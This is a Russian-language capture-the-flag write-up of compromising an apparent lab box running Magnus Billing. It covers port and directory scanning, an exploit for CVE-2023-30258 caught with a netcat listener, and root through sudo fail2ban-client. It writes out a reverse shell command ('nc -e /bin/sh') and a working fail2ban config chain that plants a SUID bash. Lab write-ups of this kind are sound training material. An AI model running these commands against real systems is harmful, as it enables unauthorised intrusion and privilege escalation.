nmap показал 4 открытых порта. Из интересных 80, 3305 mysql и неизвестный 5038 

![](../images/Pasted%20image%2020260515131423.png)

Более подробное сканирование определило тип БД

![](../images/Pasted%20image%2020260515131629.png)

На веб-сервере мы видим просто форму входа.

![](../images/Pasted%20image%2020260515131943.png)

Фаззер директорий показал несколько скрытых директорий archive, assets, lib, protected, resources и tmp.

![](../images/Pasted%20image%2020260515133502.png)

В архиве какие-то директории, но файлов внутри нет

![](../images/Pasted%20image%2020260515132423.png)

В директории lib лежит очень много разных файлов, библиотек, сейчас всё подробнее изучим

![](../images/Pasted%20image%2020260515132513.png)

Все остальные директории пустые.
На этом этапе видны несколько векторов атаки. Первое - это возможные проблемы с формой аутентификации, инъекции и тд. Второе - это поиск уязвимых библиотек, используемых на сайте, их мы можем найти либо в lib либо в исходном коде сайта, либо в сетевом взаимодействии с ним. Третье - это уязвимость в самой mbilling. Проверяем всё по очереди.

В файле .lock находится только одна зависимость
```
"name": "stripe/stripe-php",
"version": "v6.37.1",
```

Но уязвимостей в ней нет, поэтому возможно дело в чем-то другом. Все остальные зависимости не обладают какими-то жесткими CVE. Поэтому второй путь откладываем. Надо проверять другое.

У самой Magnus Billing, судя по всему, есть популярная уязвимость CVE-2023-30258

Скачиваем эксплоит, запускаем слушателя.
```
root@ip-10-114-90-37:~# nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.114.177.139 52182
$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

Мы получили доступ к системе. Теперь стабилизируем оболочку.

![](../images/Pasted%20image%2020260515142600.png)

Успешно стабилизировали и можем работать дальше.
В одной из директорий находим флаг пользователя.

![](../images/Pasted%20image%2020260515142657.png)

Проверяем какие команды можно выполнить от лица рута без пароля. Находим fail2ban-client. Поискав информацию в интернете я увидел, что с помощью этого можно получить рута.

![](../images/Pasted%20image%2020260515142929.png)

По идее можно запустить реверс шелл от рута на свой сервер. Проверяем командой 
```
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'nc -e /bin/sh 10.114.90.37 4445'
```

Это не вышло, значит идем дальше.
Конфигурация fail2ban лежит в /etc/fail2ban

Мы можем скопировать ее и при запуске программы указывать другую директорию. Далее мы создаем скрипт, который будет копировать оболочку root к нам в /tmp и устанавливать SUID
```
asterisk@ip-10-114-177-139:/tmp$ cd fail2ban
asterisk@ip-10-114-177-139:/tmp/fail2ban$ ls
action.d       filter.d   jail.local	     paths-debian.conf
fail2ban.conf  jail.conf  paths-arch.conf    paths-opensuse.conf
fail2ban.d     jail.d	  paths-common.conf


cat > /tmp/script <<EOF
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script


cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
[Definition]
actionstart = /tmp/script
EOF

cat >> /tmp/fail2ban/jail.local <<EOF
[my-custom-jail]
enabled = true
action = custom-start-command
EOF

cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
[Definition]
EOF

sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```

После выполнения этих действий видим
```
-rwsr-xr-x  1 root     root     1265648 May 15 03:20  bash
```

Запускаем и получаем оболочку root

![](../images/Pasted%20image%2020260515162236.png)

